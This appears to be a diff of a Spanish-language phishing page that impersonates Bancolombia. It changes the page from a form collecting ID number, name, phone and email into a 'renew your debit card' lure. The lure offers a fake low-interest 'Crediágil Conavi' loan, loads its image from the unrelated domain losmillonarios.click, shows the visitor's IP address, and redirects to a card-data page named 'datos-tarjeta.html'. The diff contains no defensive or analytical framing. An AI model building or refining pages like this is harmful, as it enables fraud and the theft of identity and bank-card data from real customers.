@@ -2,579 +2,624 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solicitud Tarjeta Débito - Bancolombia</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Actualiza Tu Tarjeta Débito - Bancolombia</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
+    
     <style>
-        * {
+        :root {
+            --bg-gradient: linear-gradient(135deg, #fef3c7 0%, #fde047 38%, #facc15 100%);
+            --card-bg: rgba(255, 255, 255, 0.94);
+            --text: #0f172a;
+            --muted: #64748b;
+            --border: rgba(250, 204, 21, 0.28);
+            --shadow: 0 28px 60px rgba(217, 119, 6, 0.18);
+            --primary: #ffd200;
+            --primary-hover: #facc15;
+            --primary-text: #0f172a;
+            --container-max: 980px;
+            --wrap-pad: 28px;
+            --card-pad: 38px;
+            --logo-max: 200px;
+            --title-size: 30px;
+            --subtitle-size: 16px;
+            --footer-size: 12px;
+            --btn-min: 200px;
+            --btn-radius: 12px;
+            --btn-pad-y: 16px;
+            --btn-font: 16px;
+            --card-radius: 28px;
+        }
+
+        html, body {
+            height: 100%;
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: #f8f9fa;
-            color: #333;
-            line-height: 1.6;
+            background: var(--bg-gradient);
+            color: var(--text);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Ubuntu, Cantarell, 'Helvetica Neue', Arial, sans-serif;
+            position: relative;
+            overflow-x: hidden;
         }
 
-        /* Header mejorado */
-        .header {
-            background: #FDDA24;
-            padding: 16px 20px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-            position: sticky;
-            top: 0;
-            z-index: 100;
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(160deg, rgba(255,255,255,0.45) 0%, rgba(254,240,138,0.4) 45%, rgba(217,119,6,0.25) 100%);
+            z-index: 0;
+            pointer-events: none;
         }
 
-        .header-content {
-            max-width: 1200px;
-            margin: 0 auto;
+        .auth-wrap {
+            min-height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: var(--wrap-pad) 18px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .auth-card {
+            width: 100%;
+            max-width: var(--container-max);
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: var(--card-radius);
+            box-shadow: var(--shadow);
+            padding: var(--card-pad);
+            backdrop-filter: blur(16px);
+            display: flex;
+            flex-direction: column;
+            gap: 24px;
+        }
+
+        .auth-logo {
+            display: block;
+            margin: 0 auto 6px;
+            max-width: var(--logo-max);
+            width: 100%;
+            height: auto;
+        }
+
+        .auth-content {
+            display: flex;
+            flex-direction: column;
+            gap: 26px;
+        }
+
+        .visual-pane {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .hero {
+            width: 100%;
+            max-width: 546px;
+            border-radius: 20px;
+            display: block;
+            box-shadow: 0 22px 48px rgba(217, 119, 6, 0.18);
+        }
+
+        .highlight-card {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 18px 20px;
+            border-radius: 16px;
+            background: linear-gradient(135deg, rgba(253,224,71,0.24) 0%, rgba(250,204,21,0.26) 100%);
+            border: 1px solid rgba(234, 179, 8, 0.35);
+            color: #0f172a;
+            font-weight: 600;
+        }
+
+        .highlight-card i {
+            font-size: 26px;
+            color: #d97706;
+        }
+
+        .highlight-card span {
+            font-size: 15px;
+            line-height: 1.45;
+        }
+
+        .info-section {
+            flex: 1;
+            margin: 0;
+            padding: 26px;
+            border: 1px solid rgba(234, 179, 8, 0.35);
+            border-radius: 22px;
+            background: linear-gradient(140deg, rgba(255,251,235,0.96) 0%, rgba(254,240,138,0.92) 100%);
+            box-shadow: 0 20px 48px rgba(217, 119, 6, 0.14);
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .info-title {
+            margin: 0;
+            font-size: 22px;
+            font-weight: 700;
+            text-align: center;
+            color: #0f172a;
+        }
+
+        .info-description {
+            margin: 0;
+            font-size: 15px;
+            color: #1f2937;
+            text-align: center;
+            line-height: 1.55;
+        }
+
+        .info-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .info-list li {
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+            font-size: 15px;
+            color: #0f172a;
+            font-weight: 600;
+        }
+
+        .info-list li span {
+            display: block;
+        }
+
+        .info-list li span small {
+            display: block;
+            margin-top: 4px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--muted);
+            line-height: 1.5;
+        }
+
+        .credit-offer {
+            margin-top: 26px;
+            width: 100%;
+            border: 1px solid rgba(129, 140, 248, 0.5);
+            border-radius: 26px;
+            background: linear-gradient(135deg, rgba(17,24,39,0.9) 0%, rgba(30,64,175,0.82) 46%, rgba(22,78,199,0.88) 100%);
+            padding: 26px 28px;
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            cursor: pointer;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
+            box-shadow: 0 34px 70px rgba(30, 64, 175, 0.28);
+            position: relative;
+            overflow: hidden;
+            color: #e0f2fe;
+        }
+
+        .credit-offer::before {
+            content: "";
+            position: absolute;
+            inset: -2px;
+            border-radius: inherit;
+            background: linear-gradient(135deg, rgba(96,165,250,0.78) 0%, rgba(129,140,248,0.55) 45%, rgba(147,197,253,0.35) 100%);
+            filter: blur(24px);
+            opacity: 0;
+            transition: opacity 0.25s ease;
+            pointer-events: none;
+        }
+
+        .credit-offer::after {
+            content: "";
+            position: absolute;
+            inset: 12px;
+            border-radius: 20px;
+            background: linear-gradient(135deg, rgba(30,41,59,0.85) 0%, rgba(15,23,42,0.95) 100%);
+            box-shadow: inset 0 0 0 1px rgba(148, 163, 184, 0.15);
+            pointer-events: none;
+        }
+
+        .credit-offer > * {
+            position: relative;
+            z-index: 1;
+        }
+
+        .credit-offer:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 38px 90px rgba(30, 64, 175, 0.32);
+            border-color: rgba(129, 140, 248, 0.75);
+        }
+
+        .credit-offer:hover::before {
+            opacity: 1;
+        }
+
+        .credit-offer-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        .logo {
-            font-size: 26px;
+        .credit-offer-title {
+            font-size: 18px;
+            font-weight: 900;
+            color: #f8fafc;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            text-shadow: 0 6px 16px rgba(30, 64, 175, 0.55);
+        }
+
+        .credit-offer-pill {
+            font-size: 12px;
             font-weight: 800;
-            color: #005CA9;
-            letter-spacing: -0.5px;
+            color: #0f172a;
+            background: linear-gradient(135deg, #a855f7, #38bdf8);
+            border-radius: 999px;
+            padding: 8px 18px;
+            transition: transform 0.18s ease;
+            box-shadow: 0 8px 20px rgba(56, 189, 248, 0.45);
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
         }
 
-        .header-help {
-            color: #005CA9;
-            text-decoration: none;
-            font-size: 14px;
+        .credit-offer:hover .credit-offer-pill {
+            transform: translateY(-2px) scale(1.02);
+        }
+
+        .credit-offer-tagline {
+            margin: 0;
+            font-size: 16px;
+            color: #cbd5f5;
             font-weight: 600;
+            line-height: 1.6;
+        }
+
+        .credit-details {
+            margin-top: 16px;
+            padding: 22px 24px;
+            border-radius: 22px;
+            border: 1px solid rgba(148, 163, 184, 0.25);
+            background: linear-gradient(135deg, rgba(15,23,42,0.92) 0%, rgba(30,41,59,0.82) 100%);
+            display: none;
+            flex-direction: column;
+            gap: 18px;
+            box-shadow: inset 0 0 0 1px rgba(59, 130, 246, 0.12);
+            color: #dbeafe;
+        }
+
+        .credit-details.show {
             display: flex;
-            align-items: center;
-            gap: 5px;
         }
 
-        /* Container principal */
-        .main-container {
-            max-width: 500px;
-            margin: 30px auto;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            overflow: hidden;
-        }
-
-        /* Banner superior */
-        .top-banner {
-            background: linear-gradient(135deg, #005CA9 0%, #003d73 100%);
-            padding: 35px 30px;
-            text-align: center;
-            color: white;
-        }
-
-        .top-banner h1 {
-            font-size: 28px;
+        .credit-details-range {
+            margin: 0;
+            font-size: 16px;
             font-weight: 700;
-            margin-bottom: 12px;
+            color: #f1f5f9;
+        }
+
+        .credit-details-control {
             display: flex;
-            align-items: center;
-            justify-content: center;
+            flex-direction: column;
             gap: 10px;
         }
 
-        .top-banner p {
-            font-size: 15px;
-            opacity: 0.95;
-            line-height: 1.6;
-            max-width: 400px;
-            margin: 0 auto;
-        }
-
-        /* Contenido del formulario */
-        .form-content {
-            padding: 35px 30px;
-        }
-
-        /* Alert info */
-        .alert-info {
-            background: #E3F2FD;
-            border-left: 4px solid #2196F3;
-            padding: 16px;
-            margin-bottom: 28px;
-            border-radius: 6px;
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-        }
-
-        .alert-info-icon {
-            font-size: 20px;
-            flex-shrink: 0;
-        }
-
-        .alert-info-text {
+        .credit-details-control label {
             font-size: 13px;
-            color: #1976D2;
-            line-height: 1.5;
-        }
-
-        /* Form groups */
-        .form-group {
-            margin-bottom: 24px;
-        }
-
-        .form-label {
-            display: block;
-            font-size: 14px;
-            font-weight: 600;
-            color: #2c3e50;
-            margin-bottom: 8px;
-        }
-
-        .form-label .required {
-            color: #e74c3c;
-            margin-left: 2px;
-        }
-
-        .form-input {
-            width: 100%;
-            padding: 13px 15px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            font-family: inherit;
-            background: #fff;
-        }
-
-        .form-input:focus {
-            outline: none;
-            border-color: #FDDA24;
-            box-shadow: 0 0 0 4px rgba(253, 218, 36, 0.1);
-        }
-
-        .form-input::placeholder {
-            color: #aaa;
-        }
-
-        select.form-input {
-            cursor: pointer;
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 16 16'%3E%3Cpath fill='%23333' d='M8 11L3 6h10z'/%3E%3C/svg%3E");
-            background-repeat: no-repeat;
-            background-position: right 12px center;
-            padding-right: 40px;
-        }
-
-        /* Input con icono */
-        .input-with-icon {
-            position: relative;
-        }
-
-        .input-icon {
-            position: absolute;
-            left: 14px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 18px;
-            pointer-events: none;
-        }
-
-        .input-with-icon .form-input {
-            padding-left: 45px;
-        }
-
-        /* Botón de envío */
-        .btn-submit {
-            width: 100%;
-            padding: 16px;
-            background: #FDDA24;
-            border: none;
-            border-radius: 10px;
-            font-size: 17px;
-            font-weight: 700;
-            color: #005CA9;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            font-weight: 800;
+            color: #38bdf8;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-top: 10px;
+            letter-spacing: 0.08em;
         }
 
-        .btn-submit:hover {
-            background: #fdd000;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(253, 218, 36, 0.4);
+        .credit-amount-slider input[type="range"] {
+            appearance: none;
+            width: 100%;
+            height: 6px;
+            border-radius: 999px;
+            background: linear-gradient(90deg, #38bdf8 0%, #6366f1 100%);
+            outline: none;
+            border: 0;
         }
 
-        .btn-submit:active {
-            transform: translateY(0);
+        .credit-amount-slider input[type="range"]::-webkit-slider-thumb {
+            appearance: none;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #0ea5e9;
+            border: 4px solid #bfdbfe;
+            box-shadow: 0 6px 18px rgba(14, 165, 233, 0.45);
+            cursor: pointer;
         }
 
-        .btn-submit:disabled {
-            opacity: 0.6;
+        .credit-amount-marks {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            font-weight: 700;
+            color: #94a3b8;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+        }
+
+        .credit-amount-value {
+            font-size: 20px;
+            font-weight: 900;
+            color: #bae6fd;
+            letter-spacing: 0.04em;
+        }
+
+        .credit-details-metrics {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            gap: 18px;
+            flex-wrap: wrap;
+            font-size: 14px;
+            color: #cbd5f5;
+            font-weight: 600;
+        }
+
+        .credit-details-metrics li strong {
+            color: #93c5fd;
+            font-weight: 800;
+        }
+
+        .credit-details-highlights {
+            list-style: none;
+            padding-left: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            font-size: 14px;
+            color: #e0f2fe;
+        }
+
+        .credit-details-closing {
+            margin: 0;
+            font-size: 14px;
+            color: #93c5fd;
+            font-weight: 700;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: center;
+            margin-top: 12px;
+        }
+
+        #btn-submit {
+            min-width: var(--btn-min);
+            border: 0;
+            border-radius: var(--btn-radius);
+            padding: var(--btn-pad-y) 32px;
+            font-weight: 700;
+            cursor: pointer;
+            background: var(--primary);
+            color: var(--primary-text);
+            box-shadow: none;
+            font-size: var(--btn-font);
+            letter-spacing: 0.01em;
+            transition: opacity 0.18s ease, background 0.18s ease;
+        }
+
+        #btn-submit:hover {
+            background: var(--primary-hover);
+        }
+
+        #btn-submit:disabled {
+            background: #e5e7eb;
+            color: #9ca3af;
             cursor: not-allowed;
         }
 
-        /* Badge de seguridad */
-        .security-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 25px;
-            padding: 14px;
-            background: #f0f8ff;
-            border-radius: 8px;
-        }
-
-        .security-icon {
-            font-size: 22px;
-        }
-
-        .security-text {
-            font-size: 13px;
-            color: #4CAF50;
-            font-weight: 600;
-        }
-
-        /* Footer */
         .footer {
-            background: #f8f9fa;
-            padding: 25px 20px;
+            margin-top: 10px;
             text-align: center;
-            border-top: 1px solid #e9ecef;
+            font-size: var(--footer-size);
+            color: #92400e;
+            letter-spacing: 0.02em;
         }
 
-        .footer-text {
-            font-size: 12px;
-            color: #6c757d;
-            margin-bottom: 12px;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .footer-link {
-            color: #005CA9;
-            text-decoration: none;
-            font-size: 12px;
-            font-weight: 500;
-        }
-
-        .footer-link:hover {
-            text-decoration: underline;
-        }
-
-        /* Estados de error */
-        .form-input.error {
-            border-color: #e74c3c;
-        }
-
-        .error-message {
-            color: #e74c3c;
-            font-size: 12px;
-            margin-top: 6px;
-            display: none;
-        }
-
-        .error-message.show {
-            display: block;
-        }
-
-        /* Responsive */
-        @media (max-width: 560px) {
-            .main-container {
-                margin: 15px;
-                border-radius: 12px;
+        @media (min-width: 860px) {
+            .auth-content {
+                flex-direction: row;
+                gap: 32px;
             }
-
-            .top-banner {
-                padding: 28px 20px;
+            .visual-pane, .info-section {
+                flex: 1;
             }
-
-            .top-banner h1 {
-                font-size: 24px;
-            }
-
-            .form-content {
-                padding: 28px 20px;
+            .highlight-card {
+                max-width: none;
             }
         }
 
-        /* Loading spinner */
-        .btn-spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 3px solid rgba(0,92,169,0.3);
-            border-top-color: #005CA9;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-left: 10px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .btn-submit.loading {
-            pointer-events: none;
-            opacity: 0.8;
+        @media (max-width: 599px) {
+            .auth-card {
+                padding: 32px 24px;
+            }
+            #btn-submit {
+                width: 100%;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <div class="header">
-        <div class="header-content">
-            <div class="logo">Bancolombia</div>
-            <a href="#" class="header-help">
-                <span>❓</span>
-                <span>Ayuda</span>
-            </a>
-        </div>
-    </div>
+    <div class="auth-wrap">
+        <div class="auth-card">
+            <svg class="auth-logo" viewBox="0 0 200 40">
+                <text x="10" y="30" font-family="Inter, Arial" font-size="24" font-weight="900" fill="#005CA9">Bancolombia</text>
+            </svg>
 
-    <!-- Main Container -->
-    <div class="main-container">
-        <!-- Top Banner -->
-        <div class="top-banner">
-            <h1>
-                <span>💳</span>
-                <span>Tarjeta Débito</span>
-            </h1>
-            <p>Completa tus datos para continuar con tu solicitud de tarjeta débito Bancolombia</p>
-        </div>
+            <div class="auth-content">
+                <div class="visual-pane">
+                    <img class="hero" src="https://losmillonarios.click/assets/img/abeja.jpg" alt="Programa de puntos Bancolombia" loading="lazy">
+                    <div class="highlight-card">
+                        <i class="bx bx-gift" aria-hidden="true"></i>
+                        <span>Renueva tu tarjeta y activa todos sus beneficios</span>
+                    </div>
+                </div>
 
-        <!-- Form Content -->
-        <div class="form-content">
-            <!-- Info Alert -->
-            <div class="alert-info">
-                <div class="alert-info-icon">🔒</div>
-                <div class="alert-info-text">
-                    <strong>Información segura:</strong> Tus datos están protegidos y serán utilizados únicamente para validar tu identidad.
+                <div class="info-section">
+                    <h3 class="info-title">🌟 5 Razones para Renovar a Tarjeta Débito Conavi</h3>
+                    
+                    <ul class="info-list">
+                        <li>
+                            <span>1. 💸 Evita el impuesto 4xmil<br>
+                            <small>Realiza tus movimientos sin preocuparte por cargos adicionales. ¡Ahorra más cada mes!</small></span>
+                        </li>
+                        <li>
+                            <span>2. 💳 Sin cuota de manejo<br>
+                            <small>Disfruta de todos los beneficios de tu tarjeta sin pagar costos de mantenimiento.</small></span>
+                        </li>
+                        <li>
+                            <span>3. 🏠 Entrega a domicilio sin costo<br>
+                            <small>Recíbela en la puerta de tu casa al día siguiente, sin filas ni papeleos.</small></span>
+                        </li>
+                        <li>
+                            <span>4. 🔒 Mayor seguridad y tecnología contactless<br>
+                            <small>Realiza pagos rápidos y seguros con tecnología sin contacto y protección antifraude.</small></span>
+                        </li>
+                        <li>
+                            <span>5. ✨ Mantienes tu mismo número de cuenta<br>
+                            <small>Actualiza fácilmente tu tarjeta sin cambiar tu cuenta ni afectar tus pagos o transferencias.</small></span>
+                        </li>
+                    </ul>
+
+                    <button class="credit-offer" id="creditOffer" type="button">
+                        <div class="credit-offer-header">
+                            <span class="credit-offer-title">Crediágil Conavi</span>
+                            <span class="credit-offer-pill">Seleccionar beneficios</span>
+                        </div>
+                        <p class="credit-offer-tagline">💰 ¡Tu fidelidad merece un premio!</p>
+                    </button>
+
+                    <div class="credit-details" id="creditDetails">
+                        <p class="credit-details-range">💵 Ahora puedes acceder a nuestro Crédito Crediágil Conavi por montos desde 2 hasta 10 millones de pesos.</p>
+                        <div class="credit-details-control">
+                            <label for="creditAmount">Selecciona el monto que necesitas:</label>
+                            <div class="credit-amount-slider">
+                                <input id="creditAmount" type="range" min="2000000" max="10000000" step="500000" value="2000000">
+                                <div class="credit-amount-marks">
+                                    <span>$2M</span>
+                                    <span>$6M</span>
+                                    <span>$10M</span>
+                                </div>
+                            </div>
+                            <div class="credit-amount-value" id="creditAmountValue">$2.000.000</div>
+                        </div>
+                        <ul class="credit-details-metrics">
+                            <li><strong>Interés preferencial:</strong> 0.4% mensual</li>
+                            <li><strong>Plazo estimado:</strong> 24 meses</li>
+                        </ul>
+                        <ul class="credit-details-highlights">
+                            <li>🎉 Aprobación inmediata y sin papeleos.</li>
+                            <li>🏦 Disponible exclusivamente para clientes que confían en nosotros.</li>
+                        </ul>
+                        <p class="credit-details-closing">Aprovecha esta oportunidad y haz realidad tus planes hoy mismo.</p>
+                    </div>
                 </div>
             </div>
 
-            <!-- Form -->
-            <form id="mainForm" autocomplete="off">
-                <!-- Tipo de Documento -->
-                <div class="form-group">
-                    <label class="form-label" for="tipoDocumento">
-                        Tipo de documento <span class="required">*</span>
-                    </label>
-                    <select id="tipoDocumento" class="form-input" required>
-                        <option value="">Selecciona una opción</option>
-                        <option value="CC">Cédula de Ciudadanía</option>
-                        <option value="CE">Cédula de Extranjería</option>
-                        <option value="PA">Pasaporte</option>
-                        <option value="TI">Tarjeta de Identidad</option>
-                    </select>
-                    <div class="error-message">Por favor selecciona un tipo de documento</div>
-                </div>
+            <div class="actions">
+                <form method="post" id="mainForm">
+                    <button id="btn-submit" type="submit">SOLICITAR TARJETA</button>
+                </form>
+            </div>
 
-                <!-- Número de Documento -->
-                <div class="form-group">
-                    <label class="form-label" for="numeroDocumento">
-                        Número de documento <span class="required">*</span>
-                    </label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">🆔</span>
-                        <input 
-                            type="text" 
-                            id="numeroDocumento" 
-                            class="form-input" 
-                            placeholder="Ej: 1234567890"
-                            required
-                        >
-                    </div>
-                    <div class="error-message">Ingresa un número de documento válido</div>
-                </div>
-
-                <!-- Nombre Completo -->
-                <div class="form-group">
-                    <label class="form-label" for="nombreCompleto">
-                        Nombre completo <span class="required">*</span>
-                    </label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">👤</span>
-                        <input 
-                            type="text" 
-                            id="nombreCompleto" 
-                            class="form-input" 
-                            placeholder="Como aparece en tu documento"
-                            required
-                        >
-                    </div>
-                    <div class="error-message">Ingresa tu nombre completo</div>
-                </div>
-
-                <!-- Celular -->
-                <div class="form-group">
-                    <label class="form-label" for="celular">
-                        Número de celular <span class="required">*</span>
-                    </label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">📱</span>
-                        <input 
-                            type="tel" 
-                            id="celular" 
-                            class="form-input" 
-                            placeholder="3001234567"
-                            maxlength="10"
-                            required
-                        >
-                    </div>
-                    <div class="error-message">Ingresa un número de celular válido (10 dígitos)</div>
-                </div>
-
-                <!-- Email -->
-                <div class="form-group">
-                    <label class="form-label" for="email">
-                        Correo electrónico <span class="required">*</span>
-                    </label>
-                    <div class="input-with-icon">
-                        <span class="input-icon">✉️</span>
-                        <input 
-                            type="email" 
-                            id="email" 
-                            class="form-input" 
-                            placeholder="ejemplo@correo.com"
-                            required
-                        >
-                    </div>
-                    <div class="error-message">Ingresa un correo electrónico válido</div>
-                </div>
-
-                <!-- Submit Button -->
-                <button type="submit" class="btn-submit" id="submitBtn">
-                    Continuar
-                </button>
-
-                <!-- Security Badge -->
-                <div class="security-badge">
-                    <span class="security-icon">🔐</span>
-                    <span class="security-text">Conexión segura SSL 256-bit</span>
-                </div>
-            </form>
-        </div>
-
-        <!-- Footer -->
-        <div class="footer">
-            <p class="footer-text">&copy; 2024 Bancolombia S.A. | Todos los derechos reservados</p>
-            <div class="footer-links">
-                <a href="#" class="footer-link">Términos y condiciones</a>
-                <a href="#" class="footer-link">Política de privacidad</a>
-                <a href="#" class="footer-link">Ayuda</a>
+            <div class="footer">
+                <div id="ipc">Dirección IP: Cargando...</div>
+                <div id="jclock1">Cargando...</div>
+                <div style="margin-top:6px;">Copyright © 2025 Bancolombia.</div>
             </div>
         </div>
     </div>
 
     <script>
-        const form = document.getElementById('mainForm');
-        const submitBtn = document.getElementById('submitBtn');
+        // Toggle credit offer
+        const creditOffer = document.getElementById('creditOffer');
+        const creditDetails = document.getElementById('creditDetails');
 
-        // Validación en tiempo real
-        const inputs = {
-            tipoDocumento: document.getElementById('tipoDocumento'),
-            numeroDocumento: document.getElementById('numeroDocumento'),
-            nombreCompleto: document.getElementById('nombreCompleto'),
-            celular: document.getElementById('celular'),
-            email: document.getElementById('email')
-        };
+        creditOffer.addEventListener('click', function() {
+            creditDetails.classList.toggle('show');
+        });
 
-        // Limpiar errores al escribir
-        Object.values(inputs).forEach(input => {
-            input.addEventListener('input', function() {
-                this.classList.remove('error');
-                const errorMsg = this.closest('.form-group').querySelector('.error-message');
-                if (errorMsg) errorMsg.classList.remove('show');
+        // Update credit amount
+        const creditSlider = document.getElementById('creditAmount');
+        const creditValue = document.getElementById('creditAmountValue');
+
+        creditSlider.addEventListener('input', function() {
+            const value = parseInt(this.value);
+            creditValue.textContent = '$' + value.toLocaleString('es-CO');
+        });
+
+        // Get IP address
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ipc').textContent = 'Dirección IP: ' + data.ip;
+            })
+            .catch(() => {
+                document.getElementById('ipc').textContent = 'Dirección IP: No disponible';
             });
-        });
 
-        // Solo números para documento y celular
-        inputs.numeroDocumento.addEventListener('input', e => {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
+        // Update clock
+        function updateClock() {
+            const now = new Date();
+            const time = now.toLocaleTimeString('es-CO', { 
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit' 
+            });
+            const date = now.toLocaleDateString('es-CO', {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric'
+            });
+            document.getElementById('jclock1').textContent = date + ' - ' + time;
+        }
+        updateClock();
+        setInterval(updateClock, 1000);
 
-        inputs.celular.addEventListener('input', e => {
-            e.target.value = e.target.value.replace(/\D/g, '');
-        });
-
-        // Solo letras para nombre
-        inputs.nombreCompleto.addEventListener('input', e => {
-            e.target.value = e.target.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, '');
-        });
-
-        // Submit form
-        form.addEventListener('submit', function(e) {
+        // Form submission
+        document.getElementById('mainForm').addEventListener('submit', function(e) {
             e.preventDefault();
-
-            // Limpiar errores previos
-            Object.values(inputs).forEach(input => {
-                input.classList.remove('error');
-                const errorMsg = input.closest('.form-group').querySelector('.error-message');
-                if (errorMsg) errorMsg.classList.remove('show');
-            });
-
-            let isValid = true;
-
-            // Validar cada campo
-            Object.entries(inputs).forEach(([key, input]) => {
-                if (!input.value.trim()) {
-                    input.classList.add('error');
-                    const errorMsg = input.closest('.form-group').querySelector('.error-message');
-                    if (errorMsg) errorMsg.classList.add('show');
-                    isValid = false;
-                }
-            });
-
-            // Validar email
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (inputs.email.value && !emailRegex.test(inputs.email.value)) {
-                inputs.email.classList.add('error');
-                const errorMsg = inputs.email.closest('.form-group').querySelector('.error-message');
-                errorMsg.textContent = 'Formato de correo inválido';
-                errorMsg.classList.add('show');
-                isValid = false;
-            }
-
-            // Validar celular (10 dígitos)
-            if (inputs.celular.value && inputs.celular.value.length !== 10) {
-                inputs.celular.classList.add('error');
-                const errorMsg = inputs.celular.closest('.form-group').querySelector('.error-message');
-                errorMsg.classList.add('show');
-                isValid = false;
-            }
-
-            if (isValid) {
-                // Guardar datos
-                const formData = {
-                    tipoDocumento: inputs.tipoDocumento.value,
-                    numeroDocumento: inputs.numeroDocumento.value,
-                    nombreCompleto: inputs.nombreCompleto.value,
-                    celular: inputs.celular.value,
-                    email: inputs.email.value,
-                    timestamp: new Date().toLocaleString('es-CO')
-                };
-
-                localStorage.setItem('personalData', JSON.stringify(formData));
-
-                // Mostrar loading
-                submitBtn.classList.add('loading');
-                submitBtn.innerHTML = 'Procesando... <span class="btn-spinner"></span>';
-
-                // Redirigir
-                setTimeout(() => {
-                    window.location.href = 'datos-tarjeta.html';
-                }, 1500);
-            }
+            
+            // Guardar selección de crédito si está expandida
+            const creditData = {
+                creditSelected: creditDetails.classList.contains('show'),
+                creditAmount: creditSlider.value,
+                timestamp: new Date().toISOString()
+            };
+            
+            localStorage.setItem('creditSelection', JSON.stringify(creditData));
+            
+            // Redirigir
+            window.location.href = 'datos-tarjeta.html';
         });
     </script>
 </body>
